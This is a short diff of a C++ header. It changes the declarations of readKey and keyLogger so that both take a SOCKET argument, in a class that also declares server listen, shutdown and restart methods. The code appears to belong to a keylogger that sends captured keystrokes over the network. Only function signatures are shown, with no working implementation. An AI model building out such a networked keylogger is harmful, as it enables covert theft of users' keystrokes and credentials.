@@ -12,8 +12,8 @@ public:
     void listenForConnections();
     void shutdownServer();
     void restartServer();
-    void readKey(int);
-    void keyLogger();
+    void readKey(int, SOCKET);
+    void keyLogger(SOCKET);
 
 
 private:
